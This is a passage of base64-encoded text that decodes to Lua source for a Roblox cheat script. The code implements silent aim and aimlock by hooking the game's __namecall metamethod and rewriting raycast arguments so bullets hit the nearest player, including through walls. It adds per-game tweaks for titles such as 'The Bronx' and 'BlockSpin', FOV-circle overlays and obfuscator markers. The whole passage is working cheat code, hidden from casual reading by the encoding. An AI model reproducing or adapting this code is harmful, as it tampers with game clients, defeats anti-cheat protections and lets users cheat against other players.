WcuU2lsZW50LlVzZUZpZWxkT2ZWaWV3IGFuZCBDb25maWcuU2lsZW50LlJhZGl1cyBvciA5ZTkKICAgICAgICAgICAgICAgICAgICBsb2NhbCBNYWduaXR1ZGUgPSAoVmVjdG9yMi5uZXcoVGFyZ2V0UGFydFBvc2l0aW9uLlgsVGFyZ2V0UGFydFBvc2l0aW9uLlkpIC0gTW91c2VMb2NhdGlvbikuTWFnbml0dWRlCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IERpc3RhbmNlQ2hlY2soVmFsdWUsIENvbmZpZy5TaWxlbnQuTWF4RGlzdGFuY2UpIHRoZW4gY29udGludWUgZW5kCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaWYgUmFkaXVzID4gTWFnbml0dWRlIGFuZCBPblNjcmVlbiBhbmQgVmFsdWUgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgQ29uZmlnLlNpbGVudC5XYWxsQmFuZyBhbmQgKENvbmZpZy5TaWxlbnQuV2FsbENoZWNrIGFuZCBub3QgV2FsbENoZWNrKFZhbHVlLkNoYXJhY3RlcikpIHRoZW4gY29udGludWUgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIHRhYmxlLmluc2VydChWYWxpZFBsYXllcnMsIHtQbGF5ZXIgPSBWYWx1ZSwgRGlzdGFuY2UgPSBNYWduaXR1ZGV9KQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kOwogICAgICAgICAgICBlbmQ7CiAgICAgICAgICAgIAogICAgICAgICAgICB0YWJsZS5zb3J0KFZhbGlkUGxheWVycywgZnVuY3Rpb24oUGxheWVyICwgUGxheWVyVHdvKQogICAgICAgICAgICAgICAgcmV0dXJuIFBsYXllci5EaXN0YW5jZTxQbGF5ZXJUd28uRGlzdGFuY2UgICAgICAgICAgICAgICAgCiAgICAgICAgICAgIGVuZCk7CiAgICAgICAgICAgIAogICAgICAgICAgICBpZiBWYWxpZFBsYXllcnNbMV0gdGhlbgogICAgICAgICAgICAgICAgcmV0dXJuIFZhbGlkUGxheWVyc1sxXS5QbGF5ZXIgICAgICAgICAgICAgICAgCiAgICAgICAgICAgIGVuZDsKCiAgICAgICAgICAgIHJldHVybiBuaWwgICAgICAgICAgICAKICAgICAgICBlbmQpOwoKICAgICAgICBTaWxlbnRUYXJnZXQgPSBHZXRDbG9zZXN0UGxheWVyVG9Nb3VzZVNpbGVudCgpCgogICAgICAgIFRhcmdldFRhYmxlID0ge0dldENsb3Nlc3RQbGF5ZXJUb01vdXNlQWltYm90KCk7fQogICAgICAgIAogICAgICAgIGxvY2FsIF9fbmFtZWNhbGw7IF9fbmFtZWNhbGwgPSBTb2xhcmEgYW5kIG5pbCBvciBub3QgU29sYXJhIGFuZCBob29rbWV0YW1ldGhvZChXb3Jrc3BhY2UsICJfX25hbWVjYWxsIiwgTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oLi4uKQogICAgICAgICAgICBsb2NhbCBBcmd1bWVudHMgPSB7Li4ufTsKICAgICAgICAgICAgbG9jYWwgTWV0aG9kID0gZ2V0bmFtZWNhbGxtZXRob2QoKTsKCiAgICAgICAgICAgIGlmIGNoZWNrY2FsbGVyKCkgdGhlbgogICAgICAgICAgICAgICAgcmV0dXJuIF9fbmFtZWNhbGwoLi4uKQogICAgICAgICAgICBlbmQ7CgogICAgICAgICAgICBpZiBub3QgU2lsZW50VGFyZ2V0IHRoZW4KICAgICAgICAgICAgICAgIHJldHVybiBfX25hbWVjYWxsKC4uLikKICAgICAgICAgICAgZW5kOwoKICAgICAgICAgICAgaWYgbm90IENvbmZpZy5TaWxlbnQuRW5hYmxlZCB0aGVuCiAgICAgICAgICAgICAgICByZXR1cm4gX19uYW1lY2FsbCguLi4pCiAgICAgICAgICAgIGVuZDsKCiAgICAgICAgICAgIGlmIEdhbWVfTmFtZSA9PSAiVG93biIgdGhlbgogICAgICAgICAgICAgICAgaWYgdG9zdHJpbmcoZ2V0Y2FsbGluZ3NjcmlwdCgpKSB+PSAiR3VuU2NyaXB0IiB0aGVuCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIF9fbmFtZWNhbGwoLi4uKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgaWYgbm90IChtYXRocmFuZG9tKDAsIDEwMCkgPD0gQ29uZmlnLlNpbGVudC5IaXRDaGFuY2UpIHRoZW4KICAgICAgICAgICAgICAgIHJldHVybiBfX25hbWVjYWxsKC4uLikKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICBpZiBHYW1lX05hbWUgPT0gIlRoZSBCcm9ueCIgdGhlbgogICAgICAgICAgICAgICAgbG9jYWwgU2NyaXB0ID0gZ2V0Y2FsbGluZ3NjcmlwdCgpCgogICAgICAgICAgICAgICAgaWYgbm90IChTY3JpcHQuTmFtZSA9PSAiR3VuU2NyaXB0X0xvY2FsIiBvciBTY3JpcHQuTmFtZSA9PSAiQnVsbGV0VmlzdWFsaXplclNlcnZlclNjcmlwdCIgb3IgU2NyaXB0Lk5hbWUgPT0gIkJ1bGxldFZpc3VhbGl6ZXJDbGllbnRTY3JpcHQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIF9fbmFtZWNhbGwoLi4uKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgbG9jYWwgUmFuZG9tUGFydCA9IENvbmZpZy5TaWxlbnQuVGFyZ2V0UGFydFsxXSBhbmQgQ29uZmlnLlNpbGVudC5UYXJnZXRQYXJ0W21hdGgucmFuZG9tKDEsICNDb25maWcuU2lsZW50LlRhcmdldFBhcnQpXSBvciAiSGVhZCIKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIE1ldGhvZCA9PSAiUmF5Y2FzdCIgYW5kIHRhYmxlLmZpbmQoQ29uZmlnLkdhbWUuUmF5X1N5c3RlbXMsICJSYXljYXN0IikgdGhlbgogICAgICAgICAgICAgICAgbG9jYWwgU2NyaXB0ID0gZ2V0Y2FsbGluZ3NjcmlwdCgpCgogICAgICAgICAgICAgICAgaWYgR2FtZV9OYW1lID09ICJCbG9ja1NwaW4iIHRoZW4KICAgICAgICAgICAgICAgICAgICBpZiBTY3JpcHQgYW5kIG5vdCAoU2NyaXB0Lk5hbWUgPT0gIkd1biIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIF9fbmFtZWNhbGwoLi4uKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgaWYgR2FtZV9OYW1lID09ICJTb3V0aCBCcm9ueCIgdGhlbgogICAgICAgICAgICAgICAgICAgIGlmIFNjcmlwdCBhbmQgU2NyaXB0Lk5hbWUgPT0gIlJlYWxpc21DbGllbnQiIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIF9fbmFtZWNhbGwoLi4uKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgaWYgQ29uZmlnLlNpbGVudC5FbmFibGVkIHRoZW4KICAgICAgICAgICAgICAgICAgICBpZiBDb25maWcuU2lsZW50LlRhcmdldHRpbmcgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBUYXJnZXQgPSBTaWxlbnRUYXJnZXQKICAgICAgICAgICAgICAgICAgICAgICAgaWYgVGFyZ2V0IGFuZCBUYXJnZXQuQ2hhcmFjdGVyIGFuZCBGaW5kRmlyc3RDaGlsZChUYXJnZXQuQ2hhcmFjdGVyLCBSYW5kb21QYXJ0KSBhbmQgRmluZEZpcnN0Q2hpbGQoVGFyZ2V0LkNoYXJhY3RlciwiSHVtYW5vaWQiKSBhbmQgRmluZEZpcnN0Q2hpbGQoVGFyZ2V0LkNoYXJhY3RlciwiSHVtYW5vaWQiKS5IZWFsdGggfj0gMCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBUYXJnZXRQYXJ0ID0gRmluZEZpcnN0Q2hpbGQoVGFyZ2V0LkNoYXJhY3RlciwgUmFuZG9tUGFydCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBPcmlnaW4gPSBBcmd1bWVudHNbMl07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBEaXJlY3Rpb24gPSAoVGFyZ2V0UGFydC5Qb3NpdGlvbiAtIE9yaWdpbikuVW5pdCAqIDEwMDA7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgQXJndW1lbnRzWzNdID0gRGlyZWN0aW9uOwogICAgICAgICAgICAgICAgICAgICAgICBlbmQ7CgogICAgICAgICAgICAgICAgICAgICAgICBpZiBDb25maWcuU2lsZW50LldhbGxCYW5nIGFuZCBHYW1lX05hbWUgfj0gIkJsb2NrU3BpbiIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgRmlsdGVyRGVzY2VuZGFudHNJbnN0YW5jZXMgPSB7fTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBUYXJnZXQuQ2hhcmFjdGVyIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgSW5kZXgsIFZhbHVlIGluIHBhaXJzKEdldERlc2NlbmRhbnRzKFRhcmdldC5DaGFyYWN0ZXIpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBJc0EoVmFsdWUsICJQYXJ0Iikgb3IgSXNBKFZhbHVlLCAiQmFzZVBhcnQiKSBvciBJc0EoVmFsdWUsICJNZXNoUGFydCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhYmxlLmluc2VydChGaWx0ZXJEZXNjZW5kYW50c0luc3RhbmNlcywgVmFsdWUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZDsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBSYXljYXN0UGFyYW1zID0gUmF5Y2FzdFBhcmFtcy5uZXcoKTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBSYXljYXN0UGFyYW1zLkZpbHRlclR5cGUgPSBFbnVtLlJheWNhc3RGaWx0ZXJUeXBlLkluY2x1ZGUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFJheWNhc3RQYXJhbXMuSWdub3JlV2F0ZXIgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgUmF5Y2FzdFBhcmFtcy5SZXNwZWN0Q2FuQ29sbGlkZSA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBSYXljYXN0UGFyYW1zLkZpbHRlckRlc2NlbmRhbnRzSW5zdGFuY2VzID0gRmlsdGVyRGVzY2VuZGFudHNJbnN0YW5jZXMKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEFyZ3VtZW50c1s0XSA9IFJheWNhc3RQYXJhbXMKICAgICAgICAgICAgICAgICAgICAgICAgZW5kOwoKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IENvbmZpZy5TaWxlbnQuV2FsbEJhbmcgYW5kIEdhbWVfTmFtZSA9PSAiU291dGggQnJvbngiIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIFJheWNhc3RQYXJhbXMgPSBSYXljYXN0UGFyYW1zLm5ldygpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBSYXljYXN0UGFyYW1zLkZpbHRlclR5cGUgPSBFbnVtLlJheWNhc3RGaWx0ZXJUeXBlLkJsYWNrbGlzdAogICAgICAgICAgICAgICAgICAgICAgICAgICAgUmF5Y2FzdFBhcmFtcy5GaWx0ZXJEZXNjZW5kYW50c0luc3RhbmNlcyA9IHtMb2NhbFBsYXllci5DaGFyYWN0ZXJ9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBBcmd1bWVudHNbNF0gPSBSYXljYXN0UGFyYW1zCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZDsKCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBfX25hbWVjYWxsKHVucGFjayhBcmd1bWVudHMpKQogICAgICAgICAgICAgICAgICAgIGVuZDsKICAgICAgICAgICAgICAgIGVuZDsKICAgICAgICAgICAgZW5kOwoKICAgICAgICAgICAgaWYgc3RyaW5nLmZpbmQoc3RyaW5nLmxvd2VyKE1ldGhvZCksICJmaW5kcGFydG9ucmF5IikgYW5kICh0YWJsZS5maW5kKENvbmZpZy5HYW1lLlJheV9TeXN0ZW1zLCAiRmluZFBhcnRPblJheSIpIG9yIHRhYmxlLmZpbmQoQ29uZmlnLkdhbWUuUmF5X1N5c3RlbXMsICJGaW5kUGFydE9uUmF5V2l0aFdoaXRlbGlzdCIpKSB0aGVuCiAgICAgICAgICAgICAgICBpZiBDb25maWcuU2lsZW50LkVuYWJsZWQgdGhlbgogICAgICAgICAgICAgICAgICAgIGlmIENvbmZpZy5TaWxlbnQuVGFyZ2V0dGluZyBhbmQgbWF0aHJhbmRvbSgwLCAxMDApIDw9IENvbmZpZy5TaWxlbnQuSGl0Q2hhbmNlIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgVGFyZ2V0ID0gU2lsZW50VGFyZ2V0OwogICAgICAgICAgICAgICAgICAgICAgICBpZiBUYXJnZXQgYW5kIFRhcmdldC5DaGFyYWN0ZXIgYW5kIEZpbmRGaXJzdENoaWxkKFRhcmdldC5DaGFyYWN0ZXIsIFJhbmRvbVBhcnQpIGFuZCBGaW5kRmlyc3RDaGlsZChUYXJnZXQuQ2hhcmFjdGVyLCJIdW1hbm9pZCIpIGFuZCBGaW5kRmlyc3RDaGlsZChUYXJnZXQuQ2hhcmFjdGVyLCJIdW1hbm9pZCIpLkhlYWx0aCB+PSAwIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIFRhcmdldFBhcnQgPSBGaW5kRmlyc3RDaGlsZChUYXJnZXQuQ2hhcmFjdGVyLCBSYW5kb21QYXJ0KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIE9yaWdpbiA9IEFyZ3VtZW50c1syXS5PcmlnaW47CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgRGlyZWN0aW9uID0gKFRhcmdldFBhcnQuUG9zaXRpb24gLSBPcmlnaW4pLlVuaXQgKiA5ZTE3OwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEFyZ3VtZW50c1syXSA9IFJheS5uZXcoT3JpZ2luLCBEaXJlY3Rpb24pCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgQ29uZmlnLlNpbGVudC5XYWxsQmFuZyB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFRhcmdldFBhcnQsIFRhcmdldFBhcnQuUG9zaXRpb24sIFZlY3RvcjMubmV3KDAsMCwwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIF9fbmFtZWNhbGwodW5wYWNrKEFyZ3VtZW50cykpCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZDsKICAgICAgICAgICAgICAgICAgICBlbmQ7CiAgICAgICAgICAgICAgICBlbmQ7CiAgICAgICAgICAgIGVuZDsKCiAgICAgICAgICAgIHJldHVybiBfX25hbWVjYWxsKC4uLikKICAgICAgICBlbmQpKTsKCiAgICAgICAgbG9jYWwgZnVuY3Rpb24gRHJhdyhDbGFzc05hbWUsIFByb3BlcnRpZXMpCiAgICAgICAgICAgIGxvY2FsIERyYXdpbmcgPSBEcmF3aW5nLm5ldyhDbGFzc05hbWUpOwoKICAgICAgICAgICAgZm9yIFByb3BlcnR5LCBWYWx1ZSBpbiBQcm9wZXJ0aWVzIGRvCiAgICAgICAgICAgICAgICBEcmF3aW5nW1Byb3BlcnR5XSA9IFZhbHVlOwogICAgICAgICAgICBlbmQ7CgogICAgICAgICAgICByZXR1cm4gRHJhd2luZwogICAgICAgIGVuZDsKCiAgICAgICAgbG9jYWwgQWltYm90RmllbGRPZlZpZXdPdXRsaW5lID0gRHJhdygiQ2lyY2xlIiwge1Zpc2libGUgPSBmYWxzZSwgQ29sb3IgPSBDb2xvcjMubmV3KDAsIDAsIDApLCBSYWRpdXMgPSAxMDAsIE51bVNpZGVzID0gMTAwLCBUaGlja25lc3MgPSA0fSk7CiAgICAgICAgbG9jYWwgQWltYm90RmllbGRPZlZpZXcgPSBEcmF3KCJDaXJjbGUiLCB7VmlzaWJsZSA9IGZhbHNlLCBDb2xvciA9IENvbG9yMy5uZXcoMSwgMSwgMSksIFJhZGl1cyA9IDEwMCwgTnVtU2lkZXMgPSAxMDAsIFRoaWNrbmVzcyA9IDJ9KTsKICAgICAgICBsb2NhbCBBaW1ib3RGaWVsZE9mVmlld0ZpbGwgPSBEcmF3KCJDaXJjbGUiLCB7VmlzaWJsZSA9IGZhbHNlLCBDb2xvciA9IENvbG9yMy5uZXcoMSwgMSwgMSksIFJhZGl1cyA9IDEwMCwgTnVtU2lkZXMgPSAxMDAsIFRoaWNrbmVzcyA9IDIsIEZpbGxlZCA9IHRydWV9KTsKCiAgICAgICAgbG9jYWwgQWltYm90U25hcGxpbmVPdXRsaW5lID0gRHJhdygiTGluZSIsIHtWaXNpYmxlID0gZmFsc2UsIENvbG9yID0gQ29sb3IzLm5ldygwLCAwLCAwKSwgVGhpY2tuZXNzID0gM30pOwogICAgICAgIGxvY2FsIEFpbWJvdFNuYXBsaW5lID0gRHJhdygiTGluZSIsIHtWaXNpYmxlID0gZmFsc2UsIENvbG9yID0gQ29sb3IzLm5ldygxLCAxLCAxKSwgVGhpY2tuZXNzID0gMX0pOwoKICAgICAgICAKICAgICAgICBsb2NhbCBTaWxlbnRGaWVsZE9mVmlld091dGxpbmUgPSBEcmF3KCJDaXJjbGUiLCB7VmlzaWJsZSA9IGZhbHNlLCBDb2xvciA9IENvbG9yMy5uZXcoMCwgMCwgMCksIFJhZGl1cyA9IDEwMCwgTnVtU2lkZXMgPSAxMDAsIFRoaWNrbmVzcyA9IDR9KTsKICAgICAgICBsb2NhbCBTaWxlbnRGaWVsZE9mVmlldyA9IERyYXcoIkNpcmNsZSIsIHtWaXNpYmxlID0gZmFsc2UsIENvbG9yID0gQ29sb3IzLm5ldygxLCAxLCAxKSwgUmFkaXVzID0gMTAwLCBOdW1TaWRlcyA9IDEwMCwgVGhpY2tuZXNzID0gMn0pOwogICAgICAgIGxvY2FsIFNpbGVudEZpZWxkT2ZWaWV3RmlsbCA9IERyYXcoIkNpcmNsZSIsIHtWaXNpYmxlID0gZmFsc2UsIENvbG9yID0gQ29sb3IzLm5ldygxLCAxLCAxKSwgUmFkaXVzID0gMTAwLCBOdW1TaWRlcyA9IDEwMCwgVGhpY2tuZXNzID0gMiwgRmlsbGVkID0gdHJ1ZX0pOwogICAgICAgIAogICAgICAgIGxvY2FsIFNpbGVudFNuYXBsaW5lT3V0bGluZSA9IERyYXcoIkxpbmUiLCB7VmlzaWJsZSA9IGZhbHNlLCBDb2xvciA9IENvbG9yMy5uZXcoMCwgMCwgMCksIFRoaWNrbmVzcyA9IDN9KTsKICAgICAgICBsb2NhbCBTaWxlbnRTbmFwbGluZSA9IERyYXcoIkxpbmUiLCB7VmlzaWJsZSA9IGZhbHNlLCBDb2xvciA9IENvbG9yMy5uZXcoMSwgMSwgMSksIFRoaWNrbmVzcyA9IDF9KTsKCiAgICAgICAgUnVuU2VydmljZTpCaW5kVG9SZW5kZXJTdGVwKCJGdW5jdGlvbnMiLG1hdGguaHVnZSxMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbigpCiAgICAgICAgICAgIGlmIENvbmZpZy5TaWxlbnQuTW9kZSA9PSAiQWx3YXlzIiB0aGVuCiAgICAgICAgICAgICAgICBDb25maWcuU2lsZW50LlRhcmdldHRpbmcgPSB0cnVlOwogICAgICAgICAgICBlbmQ7CiAgICAgICAgCiAgICAgICAgICAgIGxvY2FsIE1vdXNlTG9jYXRpb24gPSBVc2VySW5wdXRTZXJ2aWNlOkdldE1vdXNlTG9jYXRpb24oKQoKICAgICAgICAgICAgaWYgKG5vdCBMb2NhbFBsYXllcikgb3IgKG5vdCBMb2NhbFBsYXllci5DaGFyYWN0ZXIpIG9yIChub3QgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZCIpKSB0aGVuCiAgICAgICAgICAgICAgICByZXR1cm4gICAgICAgICAgICAgICAgCiAgICAgICAgICAgIGVuZDsKCiAgICAgICAgICAgIGlmIG5vdCBUYXJnZXRUYWJsZVsxXSB0aGVuCiAgICAgICAgICAgICAgICBUYXJnZXRUYWJsZVsxXSA9IEdldENsb3Nlc3RQbGF5ZXJUb01vdXNlQWltYm90KCk7CiAgICAgICAgICAgIGVuZDsKCiAgICAgICAgICAgIGlmIChUYXJnZXRUYWJsZVsxXSBhbmQgVGFyZ2V0VGFibGVbMV0uQ2hhcmFjdGVyIGFuZCBUYXJnZXRUYWJsZVsxXS5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikgYW5kIFRhcmdldFRhYmxlWzFdLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKS5IZWFsdGggPT0gMCkgdGhlbgogICAgICAgICAgICAgICAgVGFyZ2V0VGFibGVbMV0gPSBuaWwKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICBsb2NhbCBUYXJnZXQgPSBUYXJnZXRUYWJsZVsxXQogICAgICAgICAgICBpZiAoQ29uZmlnLkFpbWxvY2suRW5hYmxlZCBhbmQgQ29uZmlnLkFpbWxvY2suQWltaW5nIGFuZCBDb25maWcuQWltbG9jay5UeXBlID09ICJNb3VzZSIpIGFuZCAoVGFyZ2V0IGFuZCBUYXJnZXQuQ2hhcmFjdGVyIGFuZCBUYXJnZXQuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKENvbmZpZy5BaW1sb2NrLlRhcmdldFBhcnQpKSB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCBUYXJnZXRQb3NpdGlvbiA9IFRhcmdldC5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoQ29uZmlnLkFpbWxvY2suVGFyZ2V0UGFydCkuUG9zaXRpb247CiAgICAgICAgICAgICAgICBsb2NhbCBSZXN1bHQsIE9uU2NyZWVuID0gQ2FtZXJhOldvcmxkVG9TY3JlZW5Qb2ludChUYXJnZXRQb3NpdGlvbik7CiAgICAgICAgICAgICAgICBpZiBPblNjcmVlbiB0aGVuCiAgICAgICAgICAgICAgICAgICAgTW92ZV9Nb3VzZV9GdW5jdGlvbihWZWN0b3IyLm5ldyhSZXN1bHQuWCAtIE1vdXNlLlgsIFJlc3VsdC5ZIC0gTW91c2UuWSkuWCAvIChDb25maWcuQWltbG9jay5TbW9vdGhuZXNzKzEpICwgVmVjdG9yMi5uZXcoUmVzdWx0LlggLSBNb3VzZS5YLCBSZXN1bHQuWSAtIE1vdXNlLlkpLlkgLyAoQ29uZmlnLkFpbWxvY2suU21vb3RobmVzcyArIDEpKTsKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbHNlaWYgKENvbmZpZy5BaW1sb2NrLkVuYWJsZWQgYW5kIENvbmZpZy5BaW1sb2NrLkFpbWluZyBhbmQgQ29uZmlnLkFpbWxvY2suVHlwZSA9PSAiQ2FtZXJhIikgYW5kIChUYXJnZXQgYW5kIFRhcmdldC5DaGFyYWN0ZXIgYW5kIFRhcmdldC5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoQ29uZmlnLkFpbWxvY2suVGFyZ2V0UGFydCkpIHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIFNtb290aG5lc3MgPSBDb25maWcuQWltbG9jay5TbW9vdGhuZXNzICogMTA7CiAgICAgICAgICAgICAgICBDYW1lcmEuQ0ZyYW1lID0gQ2FtZXJhLkNGcmFtZTpMZXJwKENGcmFtZS5uZXcoQ2FtZXJhLkNGcmFtZS5wLCBUYXJnZXQuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKENvbmZpZy5BaW1sb2NrLlRhcmdldFBhcnQpLlBvc2l0aW9uKSwgKDEwMCAtIFNtb290aG5lc3MpIC8gMTAwKTsKICAgICAgICAgICAgZW5kOwogICAgICAgIAogICAgICAgICAgICBTaWxlbnRUYXJnZXQgPSBHZXRDbG9zZXN0UGxheWVyVG9Nb3VzZVNpbGVudCgpCiAgICAgICAgICAgIGxvY2FsIEFpbWxvY2tUYXJnZXQgPSBUYXJnZXRUYWJsZVsxXQoKICAgICAgICAgICAgQWltYm90RmllbGRPZlZpZXcuVmlzaWJsZSA9IENvbmZpZy5BaW1sb2NrLkVuYWJsZWQgYW5kIENvbmZpZy5BaW1sb2NrLkRyYXdGaWVsZE9mVmlldyBhbmQgQ29uZmlnLkFpbWxvY2suVXNlRmllbGRPZlZpZXcKICAgICAgICAgICAgQWltYm90RmllbGRPZlZpZXcuUmFkaXVzID0gQ29uZmlnLkFpbWxvY2suUmFkaXVzCiAgICAgICAgICAgIEFpbWJvdEZpZWxkT2ZWaWV3LkNvbG9yID0gQ29uZmlnLkFpbWxvY2suRmllbGRPZlZpZXdDb2xvcgogICAgICAgICAgICBBaW1ib3RGaWVsZE9mVmlldy5OdW1TaWRlcyA9IENvbmZpZy5BaW1sb2NrLlNpZGVzCiAgICAgICAgICAgIEFpbWJvdEZpZWxkT2ZWaWV3LlBvc2l0aW9uID0gTW91c2VMb2NhdGlvbgogICAgICAgICAgICBBaW1ib3RGaWVsZE9mVmlldy5OdW1TaWRlcyA9IENvbmZpZy5BaW1sb2NrLlNpZGVzCiAgICAgICAgICAgIEFpbWJvdEZpZWxkT2ZWaWV3T3V0bGluZS5OdW1TaWRlcyA9IENvbmZpZy5BaW1sb2NrLlNpZGVzCiAgICAgICAgICAgIEFpbWJvdEZpZWxkT2ZWaWV3T3V0bGluZS5SYWRpdXMgPSBBaW1ib3RGaWVsZE9mVmlldy5SYWRpdXMKICAgICAgICAgICAgQWltYm90RmllbGRPZlZpZXdPdXRsaW5lLlBvc2l0aW9uID0gQWltYm90RmllbGRPZlZpZXcuUG9zaXRpb24KICAgICAgICAgICAgQWltYm90RmllbGRPZlZpZXdPdXRsaW5lLlZpc2libGUgPSBBaW1ib3RGaWVsZE9mVmlldy5WaXNpYmxlCgogICAgICAgICAgICBBaW1ib3RGaWVsZE9mVmlld0ZpbGwuVmlzaWJsZSA9IEFpbWJvdEZpZWxkT2ZWaWV3LlZpc2libGUKICAgICAgICAgICAgQWltYm90RmllbGRPZlZpZXdGaWxsLk51bVNpZGVzID0gQWltYm90RmllbGRPZlZpZXcuTnVtU2lkZXMKICAgICAgICAgICAgQWltYm90RmllbGRPZlZpZXdGaWxsLkNvbG9yID0gQWltYm90RmllbGRPZlZpZXcuQ29sb3IKICAgICAgICAgICAgQWltYm90RmllbGRPZlZpZXdGaWxsLlJhZGl1cyA9IEFpbWJvdEZpZWxkT2ZWaWV3LlJhZGl1cwogICAgICAgICAgICBBaW1ib3RGaWVsZE9mVmlld0ZpbGwuUG9zaXRpb24gPSBBaW1ib3RGaWVsZE9mVmlldy5Qb3NpdGlvbgogICAgICAgICAgICBBaW1ib3RGaWVsZE9mVmlld0ZpbGwuVHJhbnNwYXJlbmN5ID0gQ29uZmlnLkFpbWxvY2suRmllbGRPZlZpZXdUcmFuc3BhcmVuY3kKCiAgICAgICAgICAgIFNpbGVudEZpZWxkT2ZWaWV3LlZpc2libGUgPSBDb25maWcuU2lsZW50LkVuYWJsZWQgYW5kIENvbmZpZy5TaWxlbnQuVXNlRmllbGRPZlZpZXcgYW5kIENvbmZpZy5TaWxlbnQuRHJhd0ZpZWxkT2ZWaWV3CiAgICAgICAgICAgIFNpbGVudEZpZWxkT2ZWaWV3LlJhZGl1cyA9IENvbmZpZy5TaWxlbnQuUmFkaXVzCiAgICAgICAgICAgIFNpbGVudEZpZWxkT2ZWaWV3Lk51bVNpZGVzID0gQ29uZmlnLlNpbGVudC5TaWRlcwogICAgICAgICAgICBTaWxlbnRGaWVsZE9mVmlldy5Db2xvciA9IENvbmZpZy5TaWxlbnQuRmllbGRPZlZpZXdDb2xvcgogICAgICAgICAgICBTaWxlbnRGaWVsZE9mVmlldy5OdW1TaWRlcyA9IENvbmZpZy5TaWxlbnQuU2lkZXMKICAgICAgICAgICAgU2lsZW50RmllbGRPZlZpZXcuUG9zaXRpb24gPSBNb3VzZUxvY2F0aW9uCgogICAgICAgICAgICBTaWxlbnRGaWVsZE9mVmlld0ZpbGwuVmlzaWJsZSA9IFNpbGVudEZpZWxkT2ZWaWV3LlZpc2libGUKICAgICAgICAgICAgU2lsZW50RmllbGRPZlZpZXdGaWxsLk51bVNpZGVzID0gU2lsZW50RmllbGRPZlZpZXcuTnVtU2lkZXMKICAgICAgICAgICAgU2lsZW50RmllbGRPZlZpZXdGaWxsLkNvbG9yID0gU2lsZW50RmllbGRPZlZpZXcuQ29sb3IKICAgICAgICAgICAgU2lsZW50RmllbGRPZlZpZXdGaWxsLlJhZGl1cyA9IFNpbGVudEZpZWxkT2ZWaWV3LlJhZGl1cwogICAgICAgICAgICBTaWxlbnRGaWVsZE9mVmlld0ZpbGwuU